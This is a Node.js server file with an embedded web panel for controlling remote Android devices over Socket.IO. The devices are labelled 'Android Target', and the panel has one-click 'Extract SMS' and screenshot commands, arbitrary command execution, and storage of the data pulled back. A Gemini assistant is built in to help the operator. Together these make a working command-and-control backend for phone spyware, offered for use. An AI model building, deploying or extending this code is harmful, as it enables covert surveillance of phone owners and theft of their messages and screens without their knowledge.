// index.js - Advanced Server with AI Assistant + Real Data Handler + Smart Scroll
require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const { GoogleGenerativeAI } = require('@google/generative-ai');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- File System Setup ---
const FILES_DIR = path.join(__dirname, 'file_manager_data');
if (!fs.existsSync(FILES_DIR)) {
    fs.mkdirSync(FILES_DIR, { recursive: true });
}

// --- Configuration ---
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 5e8 // 500MB max limit for large files/screenshots
});

app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

// --- AI Setup ---
let genAI = null;
if (process.env.GEMINI_API_KEY) {
    genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
}

const connectedDevices = new Map(); 
const pendingCommands = new Map(); 

// Authentication Middleware
const authMiddleware = (req, res, next) => {
    const token = req.headers['authorization'] || req.query.token;
    if (process.env.AUTH_TOKEN && token !== process.env.AUTH_TOKEN) {
        return res.status(401).json({ error: 'Unauthorized: Invalid Token' });
    }
    next();
};

// ==================== FRONTEND UI (ENHANCED MOBILE-FRIENDLY) ====================
const webUIHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Core OS Terminal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #004400; --ai: #ffaa00; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        nav { display: flex; background: var(--panel); border-bottom: 2px solid var(--border); z-index: 10; }
        nav button { flex: 1; background: transparent; color: #555; border: none; padding: 15px 5px; font-size: 15px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.3s; }
        nav button.active { color: var(--bg); background: var(--neon); }

        .app-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; padding: 10px; }
        .tab-content { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.3s ease; }
        .tab-content.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .top-bar { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
        input, select, button { background: var(--panel); color: var(--neon); border: 1px solid var(--border); padding: 12px; border-radius: 4px; font-size: 14px; outline: none; }
        .btn { background: #002200; cursor: pointer; font-weight: bold; text-transform: uppercase; border: 1px solid var(--neon); transition: 0.2s; }
        .btn:hover { background: var(--neon); color: var(--bg); }
        .btn-danger { background: #300; border-color: #ff3333; color: #ff3333; }
        .flex-1 { flex: 1; min-width: 120px; }

        #terminal-output { flex-grow: 1; background: #000; border: 1px solid var(--neon); border-radius: 4px; padding: 15px; overflow-y: auto; overflow-x: hidden; font-size: 13px; white-space: pre-wrap; word-wrap: break-word; margin-bottom: 10px; line-height: 1.5; scroll-behavior: smooth; }
        
        .input-area { display: flex; background: var(--panel); border: 1px solid var(--neon); border-radius: 4px; }
        .prompt { color: #fff; font-weight: bold; padding: 12px; border-right: 1px solid var(--border); }
        #cmdInput { border: none; background: transparent; flex-grow: 1; padding: 12px; color: var(--neon); width: 100%; }

        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid var(--border); background: var(--panel); border-radius: 4px; }
        .file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid var(--border); }
        .file-info { display: flex; align-items: center; gap: 12px; word-break: break-all; }
        .file-actions { display: flex; gap: 8px; }

        .log-error { color: #ff5555; } .log-success { color: #55ff55; } .log-cmd { color: #00aaff; margin-top: 10px;} .log-ai { color: var(--ai); font-style: italic; } .log-data { color: #ccc; }
        
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--neon); }

        /* AI Section in Home Tab */
        .ai-card { background: #1a1a00; border: 1px solid var(--ai); border-radius: 8px; padding: 15px; margin-top: 20px; }
        .ai-response { background: #000; padding: 10px; border-radius: 4px; margin-top: 10px; min-height: 60px; max-height: 200px; overflow-y: auto; color: #ccc; }
        
        @media (max-width: 600px) {
            nav button { font-size: 13px; padding: 12px 5px; }
            .prompt { padding: 12px 5px; font-size: 12px; }
            .file-item { flex-direction: column; align-items: flex-start; gap: 10px; }
            .file-actions { width: 100%; justify-content: space-between; }
            .file-actions button { flex: 1; }
        }
    </style>
</head>
<body>

    <nav>
        <button id="nav-home" class="active" onclick="switchTab('home')"><i class="fas fa-home"></i> Home</button>
        <button id="nav-terminal" onclick="switchTab('terminal')"><i class="fas fa-terminal"></i> Terminal</button>
        <button id="nav-files" onclick="switchTab('files')"><i class="fas fa-folder-open"></i> Files</button>
    </nav>

    <div class="app-container">
        
        <div class="top-bar">
            <input type="password" id="authToken" class="flex-1" placeholder="Auth Token">
            <select id="deviceSelect" class="flex-1"><option value="">Select Device...</option></select>
            <button class="btn" onclick="loadDevices()"><i class="fas fa-sync-alt"></i></button>
        </div>

        <div id="tab-home" class="tab-content active">
            <div style="text-align:center; margin-top:10px;">
                <h1 style="font-size: 2rem; text-shadow: 0 0 10px var(--neon);">SYSTEM ACTIVE</h1>
                <p style="color: #666; margin-top: 5px;">Select a device and go to Terminal.</p>
                <div style="margin-top: 20px; display: grid; gap: 10px; max-width: 300px; margin-left: auto; margin-right: auto;">
                    <button class="btn" onclick="quickCmd('ls')">List Files (ls)</button>
                    <button class="btn" onclick="quickCmd('sms > sms.txt')">Extract SMS</button>
                    <button class="btn" onclick="quickCmd('screenshot > screen.png')">Take Screenshot</button>
                </div>
                
                <!-- AI Assistant Card -->
                <div class="ai-card">
                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                        <i class="fas fa-robot" style="color: var(--ai); font-size: 24px;"></i>
                        <span style="font-weight: bold; color: var(--ai);">Gemini AI Assistant</span>
                    </div>
                    <div style="display: flex; gap: 5px;">
                        <input type="text" id="aiPrompt" placeholder="Ask me anything..." style="flex: 1;">
                        <button class="btn" onclick="askAI()" style="background: #332200;"><i class="fas fa-paper-plane"></i></button>
                    </div>
                    <div id="aiResponse" class="ai-response">Click ask to get AI help.</div>
                </div>
            </div>
        </div>

        <div id="tab-terminal" class="tab-content">
            <div id="terminal-output">Ready... Waiting for real data from app.<br></div>
            <div class="input-area">
                <span class="prompt" id="prompt-text">root:~#</span>
                <input type="text" id="cmdInput" placeholder="cmd > file.txt" onkeypress="if(event.key === 'Enter') processInput()" autocomplete="off">
                <button class="btn" onclick="processInput()" style="border:none;"><i class="fas fa-paper-plane"></i></button>
            </div>
        </div>

        <div id="tab-files" class="tab-content">
            <button class="btn" onclick="loadFiles()" style="margin-bottom:10px;">Refresh Files</button>
            <div class="file-list" id="fileList"></div>
        </div>

    </div>

    <script>
        const term = document.getElementById('terminal-output');
        const tokenInput = document.getElementById('authToken');
        const deviceSelect = document.getElementById('deviceSelect');

        window.onload = () => {
            if (localStorage.getItem('hackerToken')) {
                tokenInput.value = localStorage.getItem('hackerToken');
                setTimeout(() => { loadDevices(); loadFiles(); }, 500);
            }
        };

        deviceSelect.addEventListener('change', () => {
            const val = deviceSelect.value;
            document.getElementById('prompt-text').innerText = val ? \`\${val.substring(0,5)}:~#\` : 'root:~#';
        });

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-' + tabId).classList.add('active');
            document.getElementById('nav-' + tabId).classList.add('active');
            if(tabId === 'files') loadFiles();
        }

        function quickCmd(cmd) {
            switchTab('terminal');
            document.getElementById('cmdInput').value = cmd;
            processInput();
        }

        function log(msg, type = 'normal') {
            const div = document.createElement('div');
            div.className = 'log-' + type;
            
            if (typeof msg === 'object') {
                div.textContent = JSON.stringify(msg, null, 2);
            } else {
                div.innerHTML = String(msg).replace(/\\n/g, '<br>');
            }
            
            term.appendChild(div);
            setTimeout(() => { term.scrollTop = term.scrollHeight; }, 50);
        }

        async function fetchAPI(endpoint, options = {}) {
            const token = tokenInput.value;
            if (token) localStorage.setItem('hackerToken', token);
            const headers = { 'Authorization': token, ...options.headers };
            const res = await fetch(endpoint, { ...options, headers });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.error || 'Request failed');
            return data;
        }

        async function loadDevices() {
            try {
                const data = await fetchAPI('/api/devices');
                const prev = deviceSelect.value;
                deviceSelect.innerHTML = '<option value="">Select Device...</option>';
                data.devices.forEach(d => { deviceSelect.innerHTML += \`<option value="\${d.id}">\${d.model} (\${d.id})</option>\`; });
                if(prev) deviceSelect.value = prev;
            } catch (err) { console.error(err); }
        }

        async function processInput() {
            const deviceId = deviceSelect.value;
            const cmdInput = document.getElementById('cmdInput');
            let input = cmdInput.value.trim();
            if (!input) return;
            cmdInput.value = '';

            if (!deviceId) return log('[!] Select a device first.', 'error');

            let saveAs = null;
            if (input.includes(' > ')) {
                const parts = input.split(' > ');
                input = parts[0].trim();
                saveAs = parts[1].trim();
            }

            log('➔ ' + input + (saveAs ? \` (Saving to \${saveAs}...)\` : ''), 'cmd');
            
            try {
                const data = await fetchAPI('/api/command/' + deviceId, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: input, saveAs: saveAs })
                });
                
                let rawResult = data.result;

                if (typeof rawResult === 'string' && rawResult.length > 50000 && saveAs) {
                    log('[Data Received: ' + rawResult.length + ' bytes... Printing preview]', 'data');
                    log(rawResult.substring(0, 500) + '... [TRUNCATED]', 'data');
                } else {
                    log(rawResult || '[No Output Received from App]', 'data');
                }

                if(data.savedToFile) {
                    log(\`[✔] File Saved Successfully: \${saveAs} (Check File Manager)\`, 'success');
                }

            } catch (err) { log('[!] Error: ' + err.message, 'error'); }
        }

        // --- AI Assistant ---
        async function askAI() {
            const promptInput = document.getElementById('aiPrompt');
            const prompt = promptInput.value.trim();
            if (!prompt) return;
            promptInput.value = '';
            
            const responseDiv = document.getElementById('aiResponse');
            responseDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Thinking...';
            
            try {
                const data = await fetchAPI('/api/ai/assist', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ prompt, deviceId: deviceSelect.value || undefined })
                });
                responseDiv.innerHTML = data.response.replace(/\\n/g, '<br>');
            } catch (err) {
                responseDiv.innerHTML = '<span style="color:red">Error: ' + err.message + '</span>';
            }
        }

        // --- FILE MANAGER ---
        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'], i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        }

        async function loadFiles() {
            const list = document.getElementById('fileList');
            list.innerHTML = '<div style="padding:15px; text-align:center;">Loading...</div>';
            try {
                const data = await fetchAPI('/api/files');
                list.innerHTML = '';
                if(data.files.length === 0) return list.innerHTML = '<div style="padding:15px;text-align:center;color:#555">No files.</div>';
                
                data.files.sort((a,b) => b.mtime - a.mtime).forEach(f => {
                    list.innerHTML += \`
                        <div class="file-item">
                            <div class="file-info">
                                <i class="fas fa-file-alt" style="font-size:20px; color:#00aaff;"></i> 
                                <div>
                                    <div style="font-weight:bold">\${f.name}</div>
                                    <div style="font-size:11px; color:#666">\${formatBytes(f.size)}</div>
                                </div>
                            </div>
                            <div class="file-actions">
                                <button class="btn" onclick="window.open('/api/files/download/\${f.name}?token=\${tokenInput.value}', '_blank')"><i class="fas fa-eye"></i></button>
                                <button class="btn btn-danger" onclick="deleteFile('\${f.name}')"><i class="fas fa-trash"></i></button>
                            </div>
                        </div>
                    \`;
                });
            } catch(e) { list.innerHTML = 'Error: ' + e.message; }
        }

        async function deleteFile(name) {
            if(!confirm('Delete ' + name + '?')) return;
            try { await fetchAPI('/api/files/delete/' + name, { method: 'DELETE' }); loadFiles(); } catch(e) { alert(e); }
        }
    </script>
</body>
</html>
`;

app.get('/', (req, res) => res.send(webUIHTML));

// ==================== AI ASSISTANT ROUTE ====================
app.post('/api/ai/assist', authMiddleware, async (req, res) => {
    try {
        if (!genAI) return res.status(503).json({ success: false, error: 'AI not configured. Set GEMINI_API_KEY.' });
        const { prompt, deviceId } = req.body;
        const model = genAI.getGenerativeModel({ model: 'gemini-2.0-flash-exp' });
        
        let context = "You are an assistant for remote Android device management. Provide concise, actionable help. ";
        if (deviceId) context += `The user is currently managing device: ${deviceId}. `;
        
        const result = await model.generateContent(context + prompt);
        const response = await result.response;
        const text = response.text();
        res.json({ success: true, response: text });
    } catch (error) {
        console.error('AI Error:', error);
        res.status(500).json({ success: false, error: 'AI service failed' });
    }
});

// ==================== REST API ====================

app.get('/api/devices', authMiddleware, (req, res) => {
    try {
        const devices = Array.from(connectedDevices.values()).map(d => ({
            id: d.socket.deviceId,
            model: d.deviceInfo?.model || 'Android Target',
        }));
        res.json({ success: true, devices });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

// --- EXECUTE COMMAND & REAL DATA EXTRACTOR ---
app.post('/api/command/:deviceId', authMiddleware, async (req, res) => {
    const { deviceId } = req.params;
    const { command, saveAs } = req.body;

    const device = connectedDevices.get(deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device offline' });

    const requestId = Date.now() + '-' + uuidv4().substring(0,6);
    const commandPromise = new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
            pendingCommands.delete(requestId);
            reject(new Error('Device did not respond. Check internet on phone.'));
        }, 60000); 
        pendingCommands.set(requestId, { resolve, reject, timer, command, deviceId }); 
    });

    try {
        device.socket.emit('execute_command', { requestId, command });
        let result = await commandPromise;

        // Save logic
        if (saveAs) {
            const safeName = path.basename(saveAs); 
            const filePath = path.join(FILES_DIR, safeName);
            
            const isBinary = safeName.match(/\.(png|jpg|jpeg|apk)$/i);

            if (isBinary && typeof result === 'string') {
                let base64Data = result.replace(/^data:.*?;base64,/, ""); 
                if (/^[A-Za-z0-9+/=\s]+$/.test(base64Data)) {
                    fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));
                } else {
                    fs.writeFileSync(filePath, result);
                }
            } else {
                let dataToWrite = typeof result === 'object' ? JSON.stringify(result, null, 2) : String(result);
                fs.writeFileSync(filePath, dataToWrite, 'utf8');
            }
            return res.json({ success: true, requestId, result: result, savedToFile: true, file: safeName });
        }

        res.json({ success: true, requestId, result });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

// --- FILE MANAGER ROUTES ---
app.get('/api/files', authMiddleware, (req, res) => {
    try {
        const files = fs.readdirSync(FILES_DIR).map(name => {
            const stats = fs.statSync(path.join(FILES_DIR, name));
            return { name, size: stats.size, mtime: stats.mtimeMs }; 
        });
        res.json({ success: true, files });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

app.get('/api/files/download/:name', authMiddleware, (req, res) => {
    const safeName = path.basename(req.params.name);
    const filePath = path.join(FILES_DIR, safeName);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.status(404).send('File missing.');
});

app.delete('/api/files/delete/:name', authMiddleware, (req, res) => {
    const safeName = path.basename(req.params.name);
    const filePath = path.join(FILES_DIR, safeName);
    if (fs.existsSync(filePath)) { fs.unlinkSync(filePath); res.json({ success: true }); }
    else res.status(404).json({ success: false, error: 'Not found' });
});

// ==================== SOCKET.IO ====================
io.on('connection', (socket) => {
    socket.on('register_device', (data) => {
        const { deviceId, deviceInfo } = data;
        if (!deviceId) return;
        socket.deviceId = deviceId;
        socket.deviceInfo = deviceInfo || { model: 'Unknown' };
        connectedDevices.set(deviceId, { socket, deviceInfo });
        socket.join('device:' + deviceId);
        socket.emit('registered', { success: true });
        console.log(`📱 Device Registered: ${deviceId} (${deviceInfo?.model || 'Unknown'})`);
    });

    socket.on('command_response', (data) => {
        const { requestId, success, result, error } = data;
        const pending = pendingCommands.get(requestId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingCommands.delete(requestId);
            if (success) pending.resolve(result);
            else pending.reject(new Error(error || 'Execution failed on Android.'));
        }
    });

    socket.on('disconnect', () => {
        if (socket.deviceId) {
            connectedDevices.delete(socket.deviceId);
            console.log(`🔌 Device Disconnected: ${socket.deviceId}`);
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔════════════════════════════════════════════════════════╗
║   🚀 Remote Android Server Live on Port ${PORT}        ║
╠════════════════════════════════════════════════════════╣
║   AI Assistant: ${genAI ? 'Enabled' : 'Disabled (Set GEMINI_API_KEY)'}      ║
║   File Storage: ./file_manager_data/                   ║
╚════════════════════════════════════════════════════════╝
    `);
});